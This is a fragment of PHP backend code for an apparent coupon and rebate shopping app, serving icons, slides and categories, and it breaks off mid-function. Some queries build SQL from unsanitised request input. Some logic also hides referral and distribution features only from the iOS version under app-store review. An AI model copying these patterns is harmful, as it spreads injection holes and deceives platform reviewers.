			"uid"=>$uid,
			"content"=>filter_check($_POST['content']),
			"contact"=>filter_check($_POST['contact']),
			"type"=>intval($_POST['type']),
			"time"=>time(),
		);
		zfun::f_insert("IdeasBox",$arr);
		zfun::fecho("反馈成功",1,1);
	}
	public static function setArr(){
		$str="dtk_sxtj_data,app_yhq_zhanwai_onoff,app_high_zhanwai_onoff,app_9_zhanwai_onoff,app_20_zhanwai_onoff";
		$str.=",app_tgphb_zhanwai_onoff,app_ssxlb_zhanwai_onoff,app_qtxlb_zhanwai_onoff";
		$str.=",app_ddq_zhanwai_onoff,app_jpmj_zhanwai_onoff,app_ht_zhanwai_onoff,app_tqg_zhanwai_onoff,app_jhs_zhanwai_onoff";
		$str.=",app_yhq_dtk_type,app_high_dtk_type,app_9_dtk_type,app_20_dtk_type";
		$str.=",app_tgphb_dtk_type,app_ssxlb_dtk_type,app_qtxlb_dtk_type";
		$str.=",app_ddq_dtk_type,app_jpmj_dtk_type,app_ht_dtk_type,app_tqg_dtk_type,app_jhs_dtk_type";
		$str.=",app_double11two_zhanwai_onoff,app_double11twenty4_zhanwai_onoff,app_double11ys_zhanwai_onoff";
		$str.=",app_double11two_dtk_type,app_double11twenty4_dtk_type,app_double11ys_dtk_type";


		$set=zfun::f_getset($str);
		$data=zfun::arr64_decode($set['dtk_sxtj_data']);
		unset($set['dtk_sxtj_data']);
		foreach($data as $k=>$v){
			$set[$k]=$v;
		}
		return $set;
	}
	public function getIcon() {
		if (!$this -> sign()) {
			$this -> fecho(NULL, 0, "签名错误");
		}
		if(!empty($_POST['token'])){
			$user=zfun::f_row("User","token='".filter_check($_POST['token'])."'");
			if(empty($user))zfun::fecho("用户不存在");
			$uid=intval($user['id']);
		}
		//appcomm::read_app_cookie();
		$set=zfun::f_getset("checkVersion");
		$is_new_app=intval($_POST['is_new_app']);
		$appIconModel = $this -> getDatabase('AppIcon');
		$appIcon = $appIconModel -> select('is_show=0', "data_json,id,name,font_color,SkipUIIdentifier,type,img,url", null, null, 'sort desc');
		foreach ($appIcon as $k => $v) {
			$appIcon[$k]['img'] = UPLOAD_URL . 'slide/' . $v['img'];
			$appIcon[$k]['UIIdentifier']=$v['type'];
			if(empty($v['SkipUIIdentifier'])){
				$arr=tzbs_newAction::getarr_ksrk();
				foreach($arr as $kk=>$vv){
					if(is_numeric($vv['val'])==false)continue;
					if(intval($v['type'])!=$vv['val'])continue;
					$appIcon[$k]['SkipUIIdentifier']=$vv['type'];
				}
			}
			unset($appIcon[$k]['type']);
			//$appIcon[$k]['view_type']=self::view_type($v);
			$data=self::view_img($v);
			$appIcon[$k]['goodslist_img']=$data['img'];
			if($appIcon[$k]['view_type']==2&&$v['type']!=34)$appIcon[$k]['goodslist_img']=INDEX_WEB_URL."View/index/img/appapi/comm/logo_snatch1.png";;
			$appIcon[$k]['goodslist_str']=$data['str'];
			$data=self::view_type($v,$is_new_app);
			$appIcon[$k]['view_type']=$data['view_type'];
			$appIcon[$k]['is_showcate']=$data['is_showcate'];
			$SkipUIIdentifier=tzbs_newAction::getarr_ksrk_fuck($appIcon[$k]);
			if(!empty($SkipUIIdentifier))$appIcon[$k]['SkipUIIdentifier']=$SkipUIIdentifier;
			if(!empty($data['SkipUIIdentifier']))$appIcon[$k]['SkipUIIdentifier']=$data['SkipUIIdentifier'];
			if(!empty($v['url'])){
				$appIcon[$k]['type']=0;
				$appIcon[$k]['SkipUIIdentifier']="pub_wailian";	
			}
			if($SkipUIIdentifier=='35'&&$data['view_type']==2){
				$appIcon[$k]['goodslist_img']=INDEX_WEB_URL."View/index/img/appapi/comm/logo_snatch1.png";
			}
			$appIcon[$k]['goods_detail']=array();
			$login=tzbs_newAction::getarr_login($appIcon[$k]);
			$appIcon[$k]['is_need_login']=intval($login);
			$url=tzbs_newAction::getduomai($v['url'],$uid);
			$appIcon[$k]['url']=$url;
			$json=json_decode($v['data_json'],true);unset($appIcon[$k]['data_json']);
			$appIcon[$k]['fnuo_id']=($json['fnuo_id']);
			$appIcon[$k]['shop_type']=($json['shop_type']);
			if($_POST['appVersion']==$set['checkVersion']&&!empty($set['checkVersion'])&&$_POST['platform']=='iOS'){
				$skip=array("pub_fenxiaozhongxin","pub_qianghongbao","pub_yaoqinghaoyou","pub_yaojiangjilu","pub_hehuorenzhongxin","pub_laxinhuodong","pub_member_upgrade");
				if(in_array($appIcon[$k]['SkipUIIdentifier'],$skip))unset($appIcon[$k]);
			}
		}
		$appIcon=array_values($appIcon);
		//appcomm::set_app_cookie($appIcon);
		$this -> fecho($appIcon, 1, "好吧，被你发现了");
	}
	public static function view_img($data){
		if(strstr(",大淘客双十一2小时定金榜,大淘客双十一24小时定金榜,双11预售精品库,",','.$data['SkipUIIdentifier'].',')){
			$data['type']=$data['SkipUIIdentifier'];
		}
		switch($data['type']){
			case 6:
				$arr['img']=INDEX_WEB_URL."View/index/img/appapi/comm/logo_return.png";
				$arr['str']='超高返';
				break;
			case 1:
				$arr['img']=INDEX_WEB_URL."View/index/img/appapi/comm/logo_voucher.png";
				$arr['str']='超级券';
				break;
			case 3:
				$arr['img']=INDEX_WEB_URL."View/index/img/appapi/comm/logo_nine.png";
				$arr['str']='9块9';
				break;
			case 7:
				$arr['img']=INDEX_WEB_URL."View/index/img/appapi/comm/logo_twenty.png";
				$arr['str']='20元优选';
				break;
			case 31:
				$arr['img']=INDEX_WEB_URL."View/index/img/appapi/comm/logo_generalize.png";
				$arr['str']='推广排行榜';
				break;
			case 32:
				$arr['img']=INDEX_WEB_URL."View/index/img/appapi/comm/logo_realtime.png";
				$arr['str']='实时销量榜';
				break;
			case 33:
				$arr['img']=INDEX_WEB_URL."View/index/img/appapi/comm/logo_allday.png";
				$arr['str']='全天销量榜';
				break;
			case 34:
				$arr['img']=INDEX_WEB_URL."View/index/img/appapi/comm/logo_rob.png";
				$arr['str']='咚咚抢';
				break;
			case 35:
				$arr['img']=INDEX_WEB_URL."View/index/img/appapi/comm/logo_snatch.png";
				$arr['str']='淘抢购';
				break;
			case 36:
				$arr['img']=INDEX_WEB_URL."View/index/img/appapi/comm/logo_bargain.png";
				$arr['str']='聚划算';
				break;
			case 37:
				$arr['img']=INDEX_WEB_URL."View/index/img/appapi/comm/logo_goldmedal.png";
				$arr['str']='金牌卖家';
				break;
			case 38:
				$arr['img']=INDEX_WEB_URL."View/index/img/appapi/comm/logo_haitao.png";
				$arr['str']='海淘优选';
				break;
			case 27:
				$arr['img']='';
				$arr['str']='白菜馆';
				break;
			case 28:
				$arr['img']='';
				$arr['str']='今日上新';
				break;
			case 29:
				$arr['img']='';
				$arr['str']='京东商品';
				break;
			case '大淘客双十一2小时定金榜':
				$arr['img']=INDEX_WEB_URL."View/index/img/appapi/comm/logo_twohour.png?time=".time();
				$arr['str']=$data['show_name'];
				break;
			case '大淘客双十一24小时定金榜':
				$arr['img']=INDEX_WEB_URL."View/index/img/appapi/comm/logo_twofourhour.png?time=".time();
				$arr['str']=$data['show_name'];
				break;
			case '双11预售精品库':
				$arr['img']=INDEX_WEB_URL."View/index/img/appapi/comm/logo_double11yushou.png?time=".time();
				$arr['str']=$data['show_name'];
				break;
			default:
				$arr['img']='';
				$arr['str']='';
				break;
		}
		return $arr;
	}
	public static function view_type($data,$is_new_app){
		if($data['type']=='27'||$data['type']=='28'){
			$data['view_type']=3;
			return $data;
		}
		$att=array("6","1","3","7","31","32","33","34","35","36","37","38","大淘客双十一2小时定金榜","大淘客双十一24小时定金榜","双11预售精品库");
		if(strstr(",大淘客双十一2小时定金榜,大淘客双十一24小时定金榜,双11预售精品库,",','.$data['SkipUIIdentifier'].',')){
			$data['type']=$data['SkipUIIdentifier'];
		}
		
		
		if(strstr(",双11预售精品库,",','.$data['type'].',')){
			$data['view_type']=1;
			$data['is_showcate']=0;
			return $data;
		}
		if(in_array($data['type'],$att)==false)return '';
		$key=array("app_high_zhanwai_onoff","app_yhq_zhanwai_onoff","app_9_zhanwai_onoff","app_20_zhanwai_onoff","app_tgphb_zhanwai_onoff","app_ssxlb_zhanwai_onoff","app_qtxlb_zhanwai_onoff","app_ddq_zhanwai_onoff","app_tqg_zhanwai_onoff","app_jhs_zhanwai_onoff","app_jpmj_zhanwai_onoff","app_ht_zhanwai_onoff","app_double11two_zhanwai_onoff","app_double11twenty4_zhanwai_onoff","app_double11ys_zhanwai_onoff");
		$dtktype=array("cgf","yhq","nine","two","tgphb","ssphb","qtphb","ddq","tqg","jhs","jpmj","ht","double11two","double11twenty4","double11ys");
		$key1=array("app_high_dtk_type","app_yhq_dtk_type","app_9_dtk_type","app_20_dtk_type","app_tgphb_dtk_type","app_ssxlb_dtk_type","app_qtxlb_dtk_type","app_ddq_dtk_type","app_tqg_dtk_type","app_jhs_dtk_type","app_jpmj_dtk_type","app_ht_dtk_type","app_double11two_dtk_type","app_double11twenty4_dtk_type","app_double11ys_dtk_type");
		$bom=array();$bom1=array();$bom2=array();
		$setArr=self::setArr();
		$type=$data['type'];
		$data['SkipUIIdentifier']='';
		foreach($att as $k=>$v){
			$bom[$v]=$key[$k];
			$bom1[$v]=$key1[$k];
			$bom2[$v]=$dtktype[$k];
		}
		$type_dtktype=($setArr[$bom1[$type]]);
		
		if(empty($type_dtktype))$type_dtktype=$bom2[$type];
		$type_onoff=intval($setArr[$bom[$type]]);
		
		$data=array();
		if($type_onoff!=2&&$type_dtktype=='nine'){
			$data['view_type']='';
			if(!empty($is_new_app))$data['view_type']=3;
			$data['is_showcate']=0;
			$data['UIIdentifier']=2;
			return $data;
		}
		if($type_onoff!=2&&$type_dtktype=='two'){
			$data['view_type']='';
			if(!empty($is_new_app))$data['view_type']=3;
			$data['is_showcate']=0;
			$data['UIIdentifier']=7;
			return $data;
		}
		if($type_onoff!=2&&$type_dtktype=='cgf'){
			$data['view_type']='';
			//if(!empty($is_new_app))$data['view_type']=3;
			$data['SkipUIIdentifier']="pub_chaogaofan";
			$data['is_showcate']=0;
			$data['UIIdentifier']=1;
			return $data;
		}
		if($type_onoff!=2&&$type_dtktype=='yhq'){
			$data['view_type']='';
			//if(!empty($is_new_app))$data['view_type']=3;
			$data['SkipUIIdentifier']="pub_youhuiquan";
			$data['is_showcate']=0;
			$data['UIIdentifier']=11;
			return $data;
		}
		if($type_onoff==0){
			$data['view_type']=0;
			$data['is_showcate']=1;
			return $data;
		}
		if(($type_onoff==1||$type_onoff==3)&&$type_dtktype=='tqg'){
			$data['view_type']=2;
			$data['is_showcate']=0;
			return $data;
		}
		if(($type_onoff==1||$type_onoff==3)&&$type_dtktype=='jhs'){
			$data['view_type']=1;
			$data['is_showcate']=0;
			return $data;
		}
		if($type_onoff==1){
			$data['view_type']=0;
			$data['is_showcate']=1;
			return $data;
		}
		
		if($type_dtktype=='tgphb'){//推广排行榜
			$data['view_type']=1;
			$data['is_showcate']=0;
		}else if($type_dtktype=='ssphb'){//实时销量榜
			$data['view_type']=1;
			$data['is_showcate']=0;
		}else if($type_dtktype=='qtphb'){//全天销量榜
			$data['view_type']=1;
			$data['is_showcate']=0;
		}else if($type_dtktype=='ddq'){//咚咚抢
			$data['view_type']=2;
			$data['is_showcate']=0;
		}else if($type_dtktype=='tqg'){//淘抢购
			$data['view_type']=0;
			$data['is_showcate']=1;
		}else if($type_dtktype=='jhs'){//聚划算
			$data['view_type']=0;
			$data['is_showcate']=1;
		}else if($type_dtktype=='jpmj'){//金牌卖家
			$data['view_type']=0;
			$data['is_showcate']=1;
		}else if($type_dtktype=='ht'){//海淘
			$data['view_type']=0;
			$data['is_showcate']=1;
		}else if($type_dtktype=='cgf'){//超高返
			$data['view_type']=0;
			$data['is_showcate']=1;
			$data['UIIdentifier']=1;
		}else if($type_dtktype=='yhq'){//优惠券
			$data['view_type']=0;
			$data['is_showcate']=1;
		}else if($type_dtktype=='nine'){//九块九
			$data['view_type']=0;
			$data['is_showcate']=1;
		}else if($type_dtktype=='two'){//二十
			$data['view_type']=0;
			$data['is_showcate']=1;
		}else if($type_dtktype=='double11two'){//大淘客双十一2小时定金榜
			$data['view_type']=1;
			$data['is_showcate']=0;
		}else if($type_dtktype=='double11twenty4'){//大淘客双十一24小时定金榜
			$data['view_type']=1;
			$data['is_showcate']=0;
		}else if($type_dtktype=='大淘客双十一2小时定金榜'){//大淘客双十一2小时定金榜
			$data['view_type']=1;
			$data['is_showcate']=0;
		}else if($type_dtktype=='大淘客双十一24小时定金榜'){//大淘客双十一24小时定金榜
			$data['view_type']=1;
			$data['is_showcate']=0;
		}
		
		return $data;
	}
	public function getSlides() {
		$set=zfun::f_getset("checkVersion");
		//if(empty($set['checkVersion']))appcomm::read_app_cookie();
		if (!$this -> sign()) {
			$this -> fecho(NULL, 0, "签名错误");
		}
		if(!empty($_POST['token'])){
			$user=zfun::f_row("User","token='".filter_check($_POST['token'])."'");
			if(empty($user))zfun::fecho("用户不存在");
			$uid=intval($user['id']);
		}
		$slideModel = $this -> getDatabase("Slide");
		if($_POST['place']){
			switch ($_POST['place']) {
			 case '101':
				$where="hide=0 AND place=101";//app晒单
				break;
			 case '102':
				$where="hide=0 AND place=102";//9块9
				break;
			 case '103':
				$where="hide=0 AND place=108";//超级优惠卷
				break;
			 case '105':
				$where="hide=0 AND place=105";//商城返利
				break;	
			 case '106':
				$where="hide=0 AND place=106";//商品列表
				break;
			 case '107':
				$where="hide=0 AND place=107";//超高返
				break;	
			}
			
		}else{
			$where="hide=0 AND place=100";
		}
		
		
	
		/// 添加条件，place=100 为app
		$slides = $slideModel -> select($where, "data_json,id,img,ktype,title,SkipUIIdentifier,url,title", null, null, "sort desc");
		foreach ($slides as $k => $v) {
			$slides[$k]['name']=$v['title'];
			$slides[$k]['slide_id'] = $v['id'];
			$slides[$k]['img'] = UPLOAD_URL . 'slide/' . $v['img'];
			if(strpos($v['url'],"taobao.com")!==false)
			$slides[$k]['webType']=1;
			else if(strpos($v['url'],"jd.com")!==false)
			$slides[$k]['webType']=2;
			else
			$slides[$k]['webType']=0;
			unset($slides[$k]['id']);
			$slides[$k]['UIIdentifier']=$v['ktype'];
			
			if(empty($v['SkipUIIdentifier'])){
				$arr=tzbs_newAction::getarr_ksrk();
				foreach($arr as $kk=>$vv){
					if(is_numeric($vv['val'])==false)continue;
					if(intval($v['ktype'])!=$vv['val'])continue;
					$slides[$k]['SkipUIIdentifier']=$vv['type'];
				}
			}
			if($_POST['appVersion']==$set['checkVersion']&&!empty($set['checkVersion'])&&$_POST['platform']=='iOS'){
			
				$skip=array("pub_fenxiaozhongxin","pub_qianghongbao","pub_yaoqinghaoyou","pub_yaojiangjilu","pub_hehuorenzhongxin","pub_laxinhuodong","pub_member_upgrade");
				if(in_array($slides[$k]['SkipUIIdentifier'],$skip)){
					$v['SkipUIIdentifier']=$guanggao[$k]['SkipUIIdentifier']='pub_jinpaimaijia';
					$v['ktype']='37';
					$slides[$k]['UIIdentifier']=$v['UIIdentifier']=$v['ktype'];
				}
			}
			$SkipUIIdentifier=tzbs_newAction::getarr_ksrk_fuck($slides[$k]);
			if(!empty($SkipUIIdentifier))$slides[$k]['SkipUIIdentifier']=$SkipUIIdentifier;
			$slides[$k]['type']=$v['type']=$v['ktype'];
			$data=self::view_type($slides[$k],1);
			$slides[$k]['view_type']=$data['view_type'];
			if(!empty($data['SkipUIIdentifier']))$slides[$k]['SkipUIIdentifier']=$data['SkipUIIdentifier'];

			if(!empty($v['url'])){
				$slides[$k]['type']=0;
				$slides[$k]['SkipUIIdentifier']="pub_wailian";	
			}
			$data=self::view_img($v);
			$slides[$k]['goodslist_img']=$data['img'];
			if($slides[$k]['view_type']==2&&$v['type']!=34)$slides[$k]['goodslist_img']=INDEX_WEB_URL."View/index/img/appapi/comm/logo_snatch1.png";;
			$slides[$k]['goodslist_str']=$data['str'];
			$slides[$k]['goods_detail']=array();
			$login=tzbs_newAction::getarr_login($slides[$k]);
			$slides[$k]['is_need_login']=intval($login);
			$url=tzbs_newAction::getduomai($v['url'],$uid);
			$slides[$k]['url']=$url;
			$json=json_decode($v['data_json'],true);unset($slides[$k]['data_json']);
			$slides[$k]['fnuo_id']=($json['fnuo_id']);
			$slides[$k]['shop_type']=($json['shop_type']);
		}
		//success
		//if(empty($set['checkVersion']))appcomm::set_app_cookie($slides);
		$this -> fecho($slides, 1, "好吧，被你发现了");
	}
	public function getCates() {
		if (!$this -> sign()) {
			$this -> fecho(NULL, 0, "签名错误");
		}
		unset($_POST['token']);
		appcomm::read_app_cookie();
		$set_off=zfun::f_getset("app_9_zhanwai_onoff,app_20_zhanwai_onoff,app_shouye_zhanwai_onoff,app_high_zhanwai_onoff,app_yhq_zhanwai_onoff,app_9_dtk_type,app_20_dtk_type,app_shouye_dtk_type,app_high_dtk_type,app_yhq_dtk_type");
		if(!empty($_POST['is_new_app'])){
			if($_POST['type']==3)$_POST['type']=1;
			if($_POST['type']==7)$_POST['type']=9;
		}
		$type=$_POST['type']."";
		$tmp=array(
			"shouye"=>"app_shouye_zhanwai_onoff",
			"cgf"=>"app_high_zhanwai_onoff",
			"yhq"=>"app_yhq_zhanwai_onoff",
			"shouye"=>"app_shouye_zhanwai_onoff",
			"1"=>"app_9_zhanwai_onoff",
			"9"=>"app_20_zhanwai_onoff",
		);
		$tmp1=array(
			"shouye"=>"app_shouye_dtk_type",
			"cgf"=>"app_high_dtk_type",
			"yhq"=>"app_yhq_dtk_type",
			"shouye"=>"app_shouye_dtk_type",
			"1"=>"app_9_dtk_type",
			"9"=>"app_20_dtk_type",
		);
		
		//fpre($tmp[$type]);
		
		$str=",shouye,cgf,yhq,1,9,";
		//$str=",shouye,yhq,1,9,";
		if(strstr($str,",".$type.",")&&$set_off[$tmp[$type]]==2){//???
			$data=self::cate();
		}
		if(strstr($str,",".$type.",")&&$set_off[$tmp[$type]]==2&&$set_off[$tmp1[$type]]=='tgphb'){
			$data=array(
				0=>array("id"=>0,
				"category_name"=>"全部",
				"catename"=>"全部",
				),
			);
		}
		if(strstr($str,",".$type.",")&&$set_off[$tmp[$type]]==2&&$set_off[$tmp1[$type]]=='ssphb'){
			$data=array(
				0=>array("id"=>0,
				"category_name"=>"全部",
				"catename"=>"全部",
				),
			);
		}
		if(strstr($str,",".$type.",")&&$set_off[$tmp[$type]]==2&&$set_off[$tmp1[$type]]=='qtphb'){
			$data=array(
				0=>array("id"=>0,
				"category_name"=>"全部",
				"catename"=>"全部",
				),
			);
		}
		if(strstr($str,",".$type.",")&&$set_off[$tmp[$type]]==2&&$set_off[$tmp1[$type]]=='ddq'){
			$data=array(
				0=>array("id"=>0,
				"category_name"=>"全部",
				"catename"=>"全部",
				),
			);
		}
		if(!empty($data)){
			appcomm::set_app_cookie($data);
			zfun::fecho("首页分类",$data,1);
		}
		$categoryModel = $this -> getDatabase("Category");
		$field = "id,category_name,title,img,catename";
		if($_POST['type']=='shouye')$_POST['type']=1;
		if($_POST['type']=='cgf')$_POST['type']=3;
		if($_POST['type']=='yhq')$_POST['type']=3;
		switch($_GET['type']) {
			case 1 :
			case 2 :
			case 3 :
			case 4 :
			case 10:
				$field = "id,category_name";
				break;
			case 5 :
				$field = "id,category_name,title,img";
				break;
		}
		$category = $categoryModel -> select("pid=0 and id<>5000 AND show_type=1", $field, null, null, "show_sort desc");
		foreach ($category as $k => $v) {
			if(!empty($v['catename']))$category[$k]['category_name']=$v['catename'];
			$img = explode(',', $v['img']);
			if ($img[0]) {
				$category[$k]['img1'] = UPLOAD_URL . $img[0];
			}
			if ($img[1]) {
				$category[$k]['img2'] = UPLOAD_URL . $img[1];
			}
			unset($category[$k]['img']);
			$category[$k]['keyword']=$v['category_name'];
		}
		if(in_array($_POST['type'],array(1,3,9,10,29,28,27,36,"pub_jingdongshangpin"))){
			$arr=array();
			$arr[]=array(
				"id"=>0,
				"category_name"=>"全部",
				"catename"=>"全部",
				"title"=>"",
				"img1"=>'',
				"img2"=>"",
			);
			foreach($category as $k=>$v){
				$arr[]=$v;	
			}
			$category=$arr;
		}
		appcomm::set_app_cookie($category);
		//success
		$this -> fecho($category, 1, "好吧，被你发现了");
	}
	public function getCatesChild() {
		if (!$this -> sign()) {
			$this -> fecho(NULL, 0, "签名错误");
		}
		$categoryModel = $this -> getDatabase("Category");
		if (empty($_POST['id'])) {
			$this -> fecho(NULL, 0, "缺少参数");
		}
		//$cids = $categoryModel -> getCateId($_POST['id']);
		$cids = $categoryModel -> getCate($_POST['id'],"id,pid,category_name,img");
		$ids=-1;foreach($cids as $k=>$v)$ids.=",".$v['id'];
		$cids = $categoryModel -> getCate($ids,"id,pid,category_name,img");
		//$this -> fecho($cids, 1, "好吧，被你发现了");
		//$category = $categoryModel -> getCate($cids);
		$arr=array();
		foreach ($cids as $k => $v) {
			$img = explode(',', $v['img']);
			if (!empty($img[0])) {
				$cids[$k]['img1'] = str_replace(".JPG",".jpg",UPLOAD_URL . $img[0]);
				$cids[$k]['img1'] = str_replace(".PNG",".png",$cids[$k]['img1']);
			}
			if (!empty($img[1])) {
				$cids[$k]['img2'] = UPLOAD_URL . 'cate/' . $img[1];
			}
			unset($cids[$k]['lft']);
			unset($cids[$k]['show_type']);
			unset($cids[$k]['open_type']);
			unset($cids[$k]['show_sort']);
			unset($cids[$k]['rgt']);
			unset($cids[$k]['img']);
			$arr[]=$cids[$k];
		}
		//success
		$this -> fecho($arr, 1, "好吧，被你发现了");
	}

	/*public function getGuanggao() {
	 if (!$this -> sign()) {
	 $this -> fecho(NULL, 0, "签名错误");
	 }
	 $guanggaoModel = $this -> getDatabase("Guanggao");
	 /// 添加条件，place=100 为app
	 $guanggao = $guanggaoModel -> select("hide=0 AND type='100'", "id,img,url", null, null, "sort desc");
	 foreach ($guanggao as $k => $v) {
	 $guanggao[$k]['img'] = UPLOAD_URL . 'slide/' . $v['img'];
	 }
	 //success
	 $this -> fecho($guanggao, 1, "好吧，被你发现了");
	 }*/
	/* public function getDp(){
	 	appcomm::signcheck();
		$where="id>0 and is_show_pptm=1";
		if(!empty($_POST['cid']))$where.=" and cid =".intval($_POST['cid']);
		$fi='dp_id,name,type,logo,banner,info,hot,zhe,abc,returnbili,start_time,end_time';
		$shop=appcomm::f_goods("Dp",$where,$fi,"sort desc",NULL,20);
		foreach ($shop as $key => $value) {
			//$shop[$key]['logo']=http.str_replace(array("http:","https:"),"",$value['']);
			$shop[$key]['shop_yhq']=array();
			$where="dp_id =".$value['dp_id'];
			$shop_goods=zfun::f_select('Goods',$where,"id,fnuo_id,goods_sales,goods_type,goods_price,goods_cost_price,goods_img,goods_title,start_time,end_time,cate_id,dp_id,commission,shop_id,highcommission_wap_url,yhq_price,yhq_url,stock,yhq,yhq_span,(goods_price - yhq_price) as qh_money","3",null,"start_time desc");
			$shop_goods=zfun::f_fgoodscommission($shop_goods);
			$s_time=strtotime("today");
			$e_time=$s_time+86400;
			foreach ($shop_goods as $k => $v) {
				if(empty($shop[$key]))$shop[$key]=array();
				if(empty($shop[$key]['shop_yhq']))$shop[$key]['shop_yhq']=array();
				if(empty($shop[$key]['shop_yhq'][$k]))$shop[$key]['shop_yhq'][$k]=array("yhq_price"=>'',"yhq_span"=>'');
				if( $v['yhq']==1){//是否有优惠卷	
					$shop[$key]['shop_yhq'][$k]['yhq_price']=$v['yhq_price'];//优惠卷价格	
					$shop[$key]['shop_yhq'][$k]['yhq_span']=$v['yhq_span'];//优惠卷描述
					
				}
				if($v['start_time'] > $s_time &&$v['start_time'] < $e_time)$shop[$key]['day_new']=1;
				else $shop[$key]['day_new']=0;
			}
			if(empty($shop[$key]['shop_yhq']))$shop[$key]['is_yhq']=$shop[$key]['is_yhq_goods']=0;//优惠卷是否有存在
			else $shop[$key]['is_yhq']=$shop[$key]['is_yhq_goods']=1;
			if(empty($shop_goods)){
				$shop_goods=array(
					array("dp_id"=>$value['dp_id'],	"id"=> '', "fnuo_id"=> '',"goods_sales"=> '',  "goods_type"=> '',"goods_price"=> '', "goods_cost_price"=> '', "goods_img"=> '', "goods_title"=>'',"start_time"=> '', "end_time"=> '',"cate_id"=> '',"commission"=> '', "shop_id"=> '',"highcommission_wap_url"=> '',"yhq_price"=> '',"yhq_url"=> '', "stock"=> '', "yhq"=> '',"yhq_span"=> '', "qh_money"=>'', "fcommission"=> '', "fbili"=>'',"zhe"=> '',"fcommissionshow"=> '', "fnuo_url"=>'', "tdj_data"=> '', "getGoodsType"=> '',),
					array("dp_id"=>$value['dp_id'],	"id"=> '', "fnuo_id"=> '',"goods_sales"=> '',  "goods_type"=> '',"goods_price"=> '', "goods_cost_price"=> '', "goods_img"=> '', "goods_title"=>'',"start_time"=> '', "end_time"=> '',"cate_id"=> '',"commission"=> '', "shop_id"=> '',"highcommission_wap_url"=> '',"yhq_price"=> '',"yhq_url"=> '', "stock"=> '', "yhq"=> '',"yhq_span"=> '', "qh_money"=>'', "fcommission"=> '', "fbili"=>'',"zhe"=> '',"fcommissionshow"=> '', "fnuo_url"=>'', "tdj_data"=> '', "getGoodsType"=> '',),
					array("dp_id"=>$value['dp_id'],	"id"=> '', "fnuo_id"=> '',"goods_sales"=> '',  "goods_type"=> '',"goods_price"=> '', "goods_cost_price"=> '', "goods_img"=> '', "goods_title"=>'',"start_time"=> '', "end_time"=> '',"cate_id"=> '',"commission"=> '', "shop_id"=> '',"highcommission_wap_url"=> '',"yhq_price"=> '',"yhq_url"=> '', "stock"=> '', "yhq"=> '',"yhq_span"=> '', "qh_money"=>'', "fcommission"=> '', "fbili"=>'',"zhe"=> '',"fcommissionshow"=> '', "fnuo_url"=>'', "tdj_data"=> '', "getGoodsType"=> '',),
				);
				$json='{"id":"","fnuo_id":"","goods_sales":"","goods_type":"0","goods_price":"","goods_cost_price":"","goods_img":"","start_time":"0","end_time":"0","cate_id":"","dp_id":"","commission":0,"shop_id":"1","highcommission_wap_url":null,"yhq_price":"0.00","yhq_url":'',"stock":"0","yhq":"0","yhq_span":"","qh_money":"0","fcommission":0,"fbili":"0.00","zhe":10,"fcommissionshow":0,"fnuo_url":"","getGoodsType":""}';
				$arr=json_decode($json,true);
				$shop_goods[]=$arr;
			}	
			if($_POST['goodslist']==0)$shop[$key]['shop_goods']=array();//商品列表
			else $shop[$key]['shop_goods']=$shop_goods;	
			
		}
		foreach($shop as $k=>$v){
			if(empty($v['shop_yhq'])||empty($v['shop_yhq'][0]['yhq_price']))
			$shop[$k]['is_yhq']=$shop[$k]['is_yhq_goods']=0;
			//gg
			if(!empty($v['shop_yhq'])){
				$yhqgoods=self::sortarr($v['shop_yhq'],"yhq_price","desc");
				$end=end($yhqgoods);
				$shop[$k]['shop_yhq']=array(
					array(
						"yhq_price"=>$end['yhq_price'],
						"yhq_span"=>$end['yhq_span'],
					),
					array(
						"yhq_price"=>$yhqgoods[0]['yhq_price'],
						"yhq_span"=>$yhqgoods[0]['yhq_span'],
					),
					
				);
			}
		}
		zfun::fecho("店铺",$shop,1);
	 }
	public function getDp() {
		if (!$this -> sign()) {
			$this -> fecho(NULL, 0, "签名错误");
		}
		//appcomm::read_app_cookie();
		$shopModel = $this -> getDatabase("Dp");
		$goodsModel = $this -> getDatabase('Goods');
		$cateModel = $this -> getDatabase('Category');
		
	
	  
	  	if(!empty($_POST['dp_id'])){
		$zdp_ids=$_POST['dp_id'];
		}else{
		$dp=zfun::f_select("Dp"," is_show_pptm=1","dp_id",0,0,"sort desc");//原有
		$zdp_ids="'-1'";foreach($dp as $k=>$v)$zdp_ids.=",'".$v['dp_id']."'";//原有
		}
		$where=" id >0";
		//$shop = $shopModel -> select($where, "dp_id,cid,name,type,logo,banner,info,hot,zhe,abc,returnbili", $limit, $start, $sort);
		//为第几页
		$_POST['p'] = $_POST['p'] = !empty($_POST['p']) ? intval($_POST['p']) : 1;
		$_GET['p']=$p=intval($_POST['p']);
		//一页多少
		$limit = !empty($_POST['limit']) ? $_POST['limit'] : 20;
		$page = $this -> getApp('Page');
		$start = ($_GET['p'] - 1) * $limit;
		//$where = "hide=0 ";
		$where = "id>0";
        if(empty($_POST['sort'])){
			$_POST['sort']=1;
		}
		switch(filter_check_int($_POST['sort'])) {
			case 1 :
				// 品牌热卖
				$sort = "sort desc";
				// 获取该分类的id
				
				//$where1 .= "goods_type=2 AND cate_id in ($cates) AND start_time>" . time() . " AND end_time<" . time();
				$where1 = " dp_id IN($zdp_ids)";
				//$where1 .= "goods_type=2 AND cate_id in ($cates) ";
				//$this -> fecho($cates, 1, "ok");
				// 获取商品的dp_id用于获取商铺
				$goods_dp_id = $goodsModel -> select($where1, "dp_id", 1000, 0, "start_time desc");
				foreach ($goods_dp_id as $k => $v) {
					$dp_ids .= "'" . $v['dp_id'] . "',";
				}
				//$this -> fecho($dp_ids, 1, "ok");
				if ($dp_ids) {
					$dp_ids = rtrim($dp_ids, ",");
					$where .= " AND dp_id in ($dp_ids)";
				} else {
					$where .= " AND dp_id in (-1)";
				}
				break;
			case 2 :
				// 即将开始
				$sort = "sort desc";
				$where1="start_time > ".time()." and dp_id IN($zdp_ids)";
				$goods_dp_id = $goodsModel -> select($where1, "dp_id", 1000, 0, "start_time desc");
				//explosion;
				//$this -> fecho($goods_dp_id, 1, "好吧，被你发现了");
				foreach ($goods_dp_id as $k => $v) {
					$dp_ids .= "'" . $v['dp_id'] . "',";
				}
				if ($dp_ids) {
					$dp_ids = rtrim($dp_ids, ",");
					$where .= " AND dp_id in ($dp_ids)";
				} else {
					$where .= " AND dp_id in (-1)";
				}
				break;
		}
		//$this -> fecho($dp_ids, 1, "好吧，被你发现了");
		if(!empty($_POST['cid']))$where.=" and cid =".intval($_POST['cid']);
		zfun::isoff($where);
		$count = $shopModel -> selectRow($where, 'count(*)');
		// 店铺信息
		$shop = $shopModel -> select($where, "dp_id,name,type,logo,banner,info,hot,zhe,abc,returnbili,start_time,end_time", $limit, $start, $sort);
